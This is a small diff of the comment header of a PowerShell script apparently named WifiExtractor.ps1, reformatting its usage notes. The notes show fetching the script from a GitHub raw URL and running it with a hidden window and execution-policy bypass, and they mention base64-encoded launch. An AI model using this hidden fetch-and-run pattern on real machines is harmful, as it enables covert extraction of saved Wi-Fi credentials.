@@ -11,7 +11,14 @@
 #	-ep bypass 
 #	-c "Invoke-WebRequest -Uri https://raw.githubusercontent.com/rulosan/pst00ls/master/WifiExtractor.ps1 -OutFile WifiExtractor.ps1"
 #
-# powershell.exe -w hidden -nop -ep bypass -c ".\WifiExtractor.ps1"
+# powershell.exe
+#	-w hidden 
+#	-nop 
+#	-ep bypass 
+#	-c ".\WifiExtractor.ps1"
+#
+#  Corriendo desde base64
+#  PowerShell -EncodedCommand ""
 #########################
 
 
